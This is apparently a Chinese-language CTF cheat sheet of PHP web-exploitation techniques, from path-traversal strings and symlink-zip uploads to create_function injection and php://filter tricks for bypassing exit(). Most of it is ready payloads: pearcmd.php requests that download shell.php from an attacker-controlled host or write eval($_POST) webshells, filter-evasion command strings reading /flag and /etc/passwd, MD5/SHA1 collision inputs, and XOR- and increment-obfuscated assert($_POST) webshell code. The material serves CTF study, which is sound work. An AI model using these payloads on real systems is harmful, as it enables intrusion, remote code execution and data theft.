---
title: "php"
date: 2026-03-22 11:14:48
categories: "WEB"
tags:
  - "WEB"
cover: /img/backgrounds/bg-12.png
top_img: /img/backgrounds/bg-12.png
disableNunjucks: true
---

### Get传参
在url或者bp抓包传参，如果要求多个参数就用&连接，例如：?a=1&b=2&c=3

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-001.png)

### Post传参
使用bp抓包，添加项目：Content-Type: application/x-www-form-urlencoded

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-002.png)



# 常见考点


### 软连接绕过
#### 文件读取
压缩一个软链接，注意这里是压缩了一个指向文件的软链，类似于windows下的快捷方式

```plain
ln -s /flag 1.txt
tar -cvf 1.tar 1.txt

ln -s /etc/passwd passwd
zip -y passwd.zip passwd
```

目录穿越文件上传

这里需要上传两次，第一次文件软链接到/文件，压缩上传

```plain
ln -s /var/www/html    #软链接到/var/www/html
zip -y 1.zip html  #将html压缩为1.zip
```

第二次，然后创建一个和刚刚的软链同名(刚刚是html)的文件夹里面塞进shell，把这个文件夹连带里面的webshell打包成zip再次上传

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-003.png)



### <font style="color:rgb(31, 35, 40);">路径穿越</font>
```plain
../../../etc/passwd
....//....//....//etc/passwd     # Filter bypass

..%2f..%2f..%2fetc/passwd        # URL encoding
%2e%2e%2f
%252e%252e%252f                  # Double URL encoding
{.}{.}/flag.txt                  # Brace stripping bypass
```

### **parse_str函数变量覆盖缺陷**
@parse_str($b);

这里使用了parse_str函数来传递b的变量值

if ($a[0] != 'QNKCDZO' && md5($a[0]) == md5('QNKCDZO'))

md5()函数缺陷

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-004.png)

因为这里用到了parse_str函数来传递b，if语句的条件是拿$a[0]来比较的，因为这里的变量a的值已经是固定的了。

整体代码乍看起来又不可能，但是利用变量覆盖函数的缺陷这里可以对a的变量进行重新赋值，后面的的if语句再利用本文前面提到的md5()比较缺陷进行绕过：





<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-005.png)

dd if=/f14g

c''a''t

c$1a$1t

### foreach()**函数变量覆盖**
`foreach()`配合`$$`是个典型的变量覆盖漏洞，使用`foreach()`来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。例如传入`abc=def`，就会变成`$abc=$def`

因此解题关键为定义一个变量来保存原来`$flag`的内容

再让`$flag`=存储内容的变量名

`abc=flag&flag=abc`会被解释为`$abc=$flag&$flag=$abc`

### open、fopen限制字长
```plain

<?php
$flag = fopen('/my_secret.txt', 'r');
if (strlen($_GET['filename']) < 11) {
  readfile($_GET['filename']);
} else {
  echo "Filename too long";

```

对于每个进程，内核都提供有一个特殊的虚拟目录/dev/fd。该目录中包含"/dev/fd/n"形式的文件名，其中n是与进程中打开文件描述符相对应的编号。也就是说，/dev/fd/0就对应于进程的标志输入。比如/dev/stdin、/dev/stdout 和/dev/stderr，分别链接到/dev/fd/0、/dev/fd/1 和/dev/fd/2。

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-006.png)  




### create_function
;}任意代码;//    其中}是为了闭合函数，//是为了注释后面的代码从而让我们执行我们想要执行的代码

;}任意代码;/*

 $func =create_function('',$_POST['cmd']);$func();

比如以下源码

```plain
<?php
highlight_file(__FILE__);
//flag:/flag
if(isset($_POST['shaw'])){
    $shaw = $_POST['shaw'];
    $root = $_GET['root'];
    if(preg_match('/^[a-z_]*$/isD',$shaw)){
        if(!preg_match('/rm|ch|nc|net|ex|\-|de|cat|tac|strings|h|wget|\?|cp|mv|\||so|\$/i',$root)){
            $shaw('',$root);
        }else{
            echo "Almost there^^";
        }
    }
}
?>
```

构造$shaw=create_function，$root=;}system('ls');//  

最终为$shaw=create_function('',;}system('ls');//  )

返回结果

function a{

;} system('ls'); //

;}





### register_argc_argv
方法一：使用 VPS 或虚拟机，新建一个shell.php

这里使用 Python 开启一个服务，模拟 VPS 上一个可以被访问的文件。

```plain
python3 -m http.server
```

根据命令构造 Payload

```plain
file=/usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://本地ip/shell.php
```

默认的包安装路径是在/tmp/pear/download/

```plain
file=/tmp/pear/download/shell.php
```

方法二：直接写入文件

```plain
file=/usr/local/lib/php/pearcmd.php&+config-create+/<?@eval($_POST['shell']);?>+/var/www/html/shell.php

低权限写入
file=/usr/local/lib/php/pearcmd.php&/<?=eval($_POST['cmd'])?>+/tmp/1.php
file=/tmp/1.php   //利用

```

远程下载

```plain
page=/usr/local/lib/php/pearcmd.php&+down+http://本地ip/shell.php
```

### 
### 空格绕过
<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-007.png)



 %20、%09 、<

### 伪协议绕过死亡代码<?php exit();（file_put_contents）
```plain
<?php
    error_reporting(0);
    $file = $_GET['file'];
    $content = $_POST['content'];
    file_put_contents($file,"<?php exit();".$content);
?>
```

主要思路：利用php伪协议的写过滤器，对即将要写的内容（content）进行处理后，会将<?php exit();处理成php无法解析的内容，而我们的content则会被处理成正常的payload

#### (1)利用base64的编码解码绕过（Conversion Filters）
```plain
?file=php://filter/write=convert.base64-decode/resource=m.php
content=aPD9waHAgcGhwaW5mbygpOw==
```

content解释一下，PD9waHAgcGhwaW5mbygpOw== <----> <?php phpinfo();这部分很好理解，至于前面加了一个字符a，是因为base64解码时4个字符转3个字符,而<?php exit();只有phpexit参与了base64的解码，所以需要补一位。

#### (2)利用rot13编码来绕过（String Filters）
```plain
?file=php://filter/write=string.rot13/resource=m.php
content=<?cuc cucvasb();?>
```

#### (3)组合（String Filters+Conversion Filters）
```plain
?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=m.php
content=?>PD9waHAgcGhwaW5mbygpOw==
```

#### (4)（Conversion Filters：**convert.iconv.*:**）
```plain
php://filter/convert.iconv.UCS-2BE.UCS-2LE/resource=m.php
or
php://filter/convert.iconv.UCS-4BE.UCS-4LE/resource=m.php
```

解释：

通过UCS-2或者UCS-4的方式，对目标字符串进行2/4位一反转，也就是说构造的content字节数需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转，那我们就可以利用这种过滤器进行编码转换绕过了。我们利用如下方法构造我们需要的payload。(注意倍数问题，否则输出错误。)

```plain
echo iconv('UCS-2LE','UCS-2BE','<?php phpinfo();?>');    //?<hp phpipfn(o;)>?

echo iconv('UCS-4LE','UCS-4BE','<?php phpinfo();');    //hp?<hp pfnip;)(o
```

然后构造我们的content内容使得<?php exit();在经过该过滤器后被乱码无法正常解析从而绕过死亡退出同时保证我们的payload在经过过滤器以后被正常解析。

```plain
content=a?<hp phpipfn(o;)>?
or
content=aaahp?<hp pfnip;)(o
```

参考文章：[https://www.cnblogs.com/hithub/p/16849600.html](https://www.cnblogs.com/hithub/p/16849600.html)



### require_once 绕过不能重复包含文件的限制
```plain
<?php
error_reporting(E_ALL);
require_once('flag.php');
highlight_file(__FILE__);
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    require_once($content);
} 
```

php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once('flag.php')，已经include的文件不可以再require_once。

怎么设想如何绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。

在这里有个小知识点，/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:

```plain
php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

### git泄露
<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-008.png)

python2 git_extract.py [http://gz.imxbt.cn:20881/.git/](http://gz.imxbt.cn:20881/.git/)

python2 GitHack.py -u [http://5417fde8-59f1-4767-aae7-75f03953e2bf.www.polarctf.com:8090/.git](http://5417fde8-59f1-4767-aae7-75f03953e2bf.www.polarctf.com:8090/.git)

### swp泄露
下载swp文件，在linux使用以下命令

vim -r index.php.swp

### SSL 证书泄露
<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-009.png)申请 HTTPS 是需要 SSL 证书的

这个证书可以去在线网站查询的，去这个网站查询域名可以看到证书信息<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-010.png)

### 网站历史信息泄露
上题（Code X Sport Jung'23 CTF）

web.archive.org 免费提供全球网站历史信息查询服务，最早可追溯到 1996 年

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-011.png)

具体题目提供的时间查找快照

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-012.png)

### 回溯绕过
parameterLimit选项用于指定query string 或者 request payload的最大数量。 默认情况下，它的值是**1000**。也就是说当url传的值大于一千时，就不会执行admin=false

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-013.png)

• /etc/passwd      # ../../etc/passwd路径穿越

该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为 用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell（以冒号作为分隔符）

• /proc/self

proc是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中数据。通过/proc/PID可以访问对应PID的进程内核数据，而/proc/self访问的是当前进程的内核数据。

• /proc/self/cmdline

该文件包含的内容为当前进程执行的命令行参数。

• /proc/self/mem

/proc/self/mem是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合/proc/self/maps中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。

• /proc/self/maps

/proc/self/maps包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。





### preg_match()绕过方法


1数组绕过，即传入的参数为数组

2利用PCRE回溯次数限制绕过：让回溯次数超过最大限制就可以使preg_match()函数返回false,从而绕过限制，中文的回溯次数在100万次就会崩溃，这个回溯保护使PHP为了防止关于正则表达式的DDOS

3换行符绕过：.不会匹配换行符，所以使用%0a就可以绕过，此题不适应

绕过

PCRE回溯次数限制绕过

import requests

data = {"xdmtql": "sys nb" + "aaaaa" * 1000000}

res = requests.post('http://xxx.www.polarctf.com:8090', data=data, allow_redirects=False)

print(res.content)

### intval绕过方法
```plain
<?php
echo intval(42);                      // 42
echo intval(4.2);                     // 4
echo intval('42');                    // 42
echo intval('+42');                   // 42
echo intval('-42');                   // -42
echo intval(042);                     // 34   八进制
echo intval('042');                   // 42
echo intval(1e10);                    // 10000000000
echo intval('1e10');                  // 10000000000
echo intval(0x1A);                    // 26   十六进制
echo intval(42000000);                // 42000000
echo intval(420000000000000000000);   // 0
echo intval('420000000000000000000'); // 2147483647
echo intval(42, 8);                   // 42
echo intval('42', 8);                 // 34
echo intval(array());                 // 0
echo intval(array('foo', 'bar'));     // 1
?>
```

1）当某个数字被过滤时，可以使用它的 8进制/16进制来绕过；比如过滤10，就用012（八进制）或0xA（十六进制）。

2）对于弱比较（a==b），可以给a、b两个参数传入空数组，使弱比较为true。

3）当某个数字被过滤时，可以给它增加小数位来绕过；比如过滤3，就用3.1。

4）当某个数字被过滤时，可以给它拼接字符串来绕过；比如过滤3，就用3ab。（GET请求的参数会自动拼接单引号）

5）当某个数字被过滤时，可以两次取反来绕过；比如过滤10，就用~~10。

6）当某个数字被过滤时，可以使用算数运算符绕过；比如过滤10，就用 5+5 或 2*5。

```plain
(intval($year) < 2024 && intval($year + 1) > 2025)
year=2023e2   //科学计数法中e在intval时解析成字母，截断转换，而在加法中正常表现为科学计数法
```

### (file_get_contents($a,'r')) === 'I want flag')
上传文件进行绕过，a=data:text/plain,I want flag，file_get_contents($text,'r')是读取文件的内容，说明我们首先要上传一个文件，并且它的内容还得是"welcome to the zjctf"，我们考虑用data协议，data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。

### PHP中MD5和sha1绕过方式总结
#### 0e绕过弱比较(MD5函数漏洞)
PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同。这种方式只有在弱比较的时候才能使用。

以下值在md5加密后以0E开头：

+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">QNKCDZO</font>
+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">240610708</font>
+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">s878926199a</font>
+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">s155964671a</font>
+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">s214587387a</font>
+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">s214587387a</font>

以下值在sha1加密后以0E开头：

+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">aaroZmOk</font>
+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">aaK1STfY</font>
+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">aaO8zKZF</font>
+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">aa3OFF9m</font>
+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">0e1290633704</font>
+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">10932435112</font>

双重MD5加密后0E开头：

+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">7r4lGXCH2Ksu2JNT3BYM</font>
+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">CbDLytmyGm2xQyaLNhWn</font>
+ <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">770hQgrBOjrcqftrlaZk</font>

#### 数组绕过
对于php强比较和弱比较：md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。

```plain
?a[]=1&b[]=2
```

#### MD5碰撞
```plain
<?php
show_source(__FILE__);
if((string)$_POST['a']!==(string)$_POST['b'] && 
  md5($_POST['a'])===md5($_POST['b'])){
    echo "flag";
}

```

比较a，b时将a，b转换为字符串比较，这边就不能用数组了。因为数组转换为字符串时都会变成Array。数组要求构造a和b不同，但是MD5相同，也就是说要求传入两个MD5相同的不同字符串。所以我们只能用MD5碰撞来实现

```plain
#1
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   
b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   
#2
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%
#3
$a="\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";
$b="\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";

注意一点，post时一定要urlencode！！！

文件：
linux使用md5collgen碰撞生成两个md5值相同但内容不同的文件
md5collgen -o 1.bin 2.bin

windows可以下载fastcoll，碰撞生成两个md5值相同但内容不同的文件
fastcoll.exe -p 123.txt -o 1.txt 2.txt
```

#### sha1碰撞
url:

```plain
a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
两个SHA1值相同而不一样(SHA256的值不同)的pdf文件, shattered-1.pdf和shattered-2.pdf
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-014.png)

#### NaN和INF
NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至NAN=NAN都是false，但md5('NaN')=md5('NaN')为true。

#### 拦截比较（md5和sha256）
```plain
substr(md5(?),0,5)==='8ffb1'

```

**md5拦截爆破**

给出一段md5值要求找到匹配的原码。一般使用爆破脚本：

```plain
import hashlib
from multiprocessing.dummy import Pool as ThreadPool

# MD5截断数值已知 求原始数据
# 例子 substr(md5(captcha), 0, 6)=60b7ef

def md5(s):  # 计算MD5字符串
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()


keymd5 = '8ffb1'   #已知的md5截断值
md5start = 0   # 设置题目已知的截断位置
md5length = 5

def findmd5(sss):    # 输入范围 里面会进行md5测试
    key = sss.split(':')
    start = int(key[0])   # 开始位置
    end = int(key[1])    # 结束位置
    result = 0
    for i in range(start, end):
        # print(md5(i)[md5start:md5length])
        if md5(i)[0:5] == keymd5:            # 拿到加密字符串
            result = i
            print(result)    # 打印
            break


list=[]  # 参数列表
for i in range(10):   # 多线程的数字列表 开始与结尾
    list.append(str(10000000*i) + ':' + str(10000000*(i+1)))
pool = ThreadPool()    # 多线程任务
pool.map(findmd5, list) # 函数 与参数列表
pool.close()
pool.join()

```

**sha256拦截爆破**

```plain
import hashlib
from multiprocessing.dummy import Pool as ThreadPool

# sha256截断数值已知 求原始数据
# 例子 substr(sha256(captcha), 0, 6)=60b7ef

def sha256(s):  # 计算sha256字符串
    return hashlib.sha256(('TQLCTF'+str(s)).encode('utf-8')).hexdigest()


keysha256 = '5625f'   #已知的sha256截断值
sha256start = 0   # 设置题目已知的截断位置
sha256length = 5

def findsha256(sss):    # 输入范围 里面会进行sha256测试
    key = sss.split(':')
    start = int(key[0])   # 开始位置
    end = int(key[1])    # 结束位置
    result = 0
    for i in range(start, end):
        # print(sha256(i)[sha256start:sha256length])
        if sha256(i)[0:5] == keysha256:            # 拿到加密字符串
            result = i
            print(result)    # 打印
            break


list=[]  # 参数列表
for i in range(10):   # 多线程的数字列表 开始与结尾
    list.append(str(10000000*i) + ':' + str(10000000*(i+1)))
pool = ThreadPool()    # 多线程任务
pool.map(findsha256, list) # 函数 与参数列表
pool.close()
pool.join()

```

### http特性
#### <font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">（1）HTTP请求头：request-header</font>
1.accept:浏览器所接收的信息，通知服务器浏览器可以接受的文件类型  
2.accept-Encoding:通知服务器浏览器接收的编码方式  
3.accept-Language:通知服务器浏览器接收的语言  
4.connection:保持连接  
5.host:主机名称，要访问的主机名称。eg.localhost:访问自己的电脑和端口。  
6.user-agent:发出请求的客户端信息  
7.cookie:浏览器存储的缓存信息，把保存在该请求域名的所有cookies发送给服务器。  
8.content-type:浏览器所发出的内容类型。【1.application/x-www-form-urlencoded:表单形式，  
9.referer:当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的  
10.X-Forwarded-For:简称XFF头，代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项

```plain
X-Forwarded-For:127.0.0.1
X-Forwarded-Host:127.0.0.1
X-Client-IP:127.0.0.1
X-remote-IP:127.0.0.1
X-remote-addr:127.0.0.1
True-Client-IP:127.0.0.1
X-Client-IP:127.0.0.1
Client-IP:127.0.0.1
X-Real-IP:127.0.0.1
```

# 常见
# 命令执行绕过
### 输出函数：
```plain
cat函数 由第一行开始显示内容，并将所有内容输出
tac函数 从最后一行倒序显示内容，并将所有内容输出
nl      类似于cat -n，显示时输出行号
more    根据窗口大小，一页一页的现实文件内容
less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符
head    只显示头几行
tail    只显示最后几行
sort    文本内容排列
uniq    可以查看，删除文件重复行并输出剩余内容
vim     一种编辑器，这个也可以查看
tac
od      以二进制的方式读取档案内容
vi      一种编辑器，这个也可以查看
rev()   用于返回数据对象的反向版本
strings 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings
paste	  把每个文件以列对列的方式，一列列地加以合并
grep	 ：grep { flag.php 打印有”{“的一行、grep 'fla' flag.php
sed		  一种编辑器，可以用sed -f flag.php读取flag
tee     写入一个文件 tac /flag | tee 2.txt 效果和>相同，>>为覆盖
base64  命令读取文件 ：?c=base64 flag.php 、?c=/bin/base64 flag.php、echo "flag.php" | base64
mv      函数的作用是对文件进行重命名，可以直接在网页中访问txt文件 ?c=mv f?lg.php a.txt
cp      用cp命令将flag的内容复制到1.txt cp flag.php 1.txt、echo `cp flag.php 1.txt`;

var_export

```

  


### 命令执行函数：
```plain
system() 输出并返回最后一行shell结果
passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。（替换system）。
exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。
echo+反引号命令执行 用反引号执行shell命令 ?c=echo `tac flag.php`;
eval(end(current(get_defined_vars())));&b=system('cat /flag'); eval函数执行任意php命令
shell_exec() 无回显  需要配合echo命令 ?c=echo shell_exec("tac flag.php");
popen()/proc_open()
die()
空格绕过
${IFS}
{IFS}$9
$IFS$9
 %20、%09 、<
重定向符：<>（但是不支持后面跟通配符）

水平制表符%09
%0a 回车
%0d换行
$IFS$1
%09(tab)
%20(space)
$IFS
方法一：sys=passthru('sort%09/flag');
方法二：?sys=echo%09`vi%09`  //使用引号转义
```



### 异或构造
```bash
("%03%09%03%04%15%1D"^"%70%70%70%70%70%70")("%1C%03"^"%70%70");
##system('ls')

("%03%09%03%04%15%1D"^"%70%70%70%70%70%70")("%1C%03%50%5F"^"%70%70%70%70");
##system('ls /')

("%03%09%03%04%15%1D"^"%70%70%70%70%70%70")("%13%11%04%50%5F%16%1C%11%17"^"%70%70%70%70%70%70%70%70%70");
##system('cat /flag')

('^^^^^^^'^'.6.7081').'()'  ##这个可以构造出phpinfo


('|||'^'...'^'213').('*~'^'^^').'*'.('|'^'.'^'2');
# `cat *`
```

```plain
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);// assert($_POST[_]);
```

### PHP自增构造
bypass

对于中括号的过滤可以使用花括号代替

对于/的过滤可以放弃获取N字符，选择获取A字符开始构造比较近的GET

```plain
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

```plain
$__=("#"^"|");$__.=("."^"~");$__.=("/"^"`");$__.=("|"^"/");$__.=("{"^"/");$$__[_]($$__[__]);
// $_POST[_]($_POST[__]);
%24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B
用法：code=%24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B&_=system&_=ls

$_=(0/0)._;$_=$_[0];$_1=++$_;$__=_;$__.=++$_;$__.=$_1;$_++;$_++;$__.=++$_;$__.=++$_;$$__[0]($$__[1]);
//$_POST[0]($_POST[1])

$%DF=(_/_._)[0];$_=++$%DF;$%DE=_;$%DE.=++$_.$%DF;$_++;$_++;$%DE.=++$_;$%DE.=++$_;$$%DE[0]($$%DE[_]);
//$_POST[0]($_POST[_])
$%DF=(_/_._)[0];$_=%2B%2B$%DF;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE[0]($$%DE[_]);&0=system&_=cat /f*

$%DE=_(%DE/%DE)[%DE];$_=++$%DE;$%DF=_.++$%DE.$_;$%DE++;$%DE++;$%DF.=++$%DE.++$%DE;$$%DF[%DE]($$%DF[_]);
//$_POST[a]($_POST[_])
$%DE=_(%DE/%DE)[%DE];$_=%2B%2B$%DE;$%DF=_.%2B%2B$%DE.$_;$%DE%2B%2B;$%DE%2B%2B;$%DF.=%2B%2B$%DE.%2B%2B$%DE;$$%DF[%DE]($$%DF[_]);
```

```plain
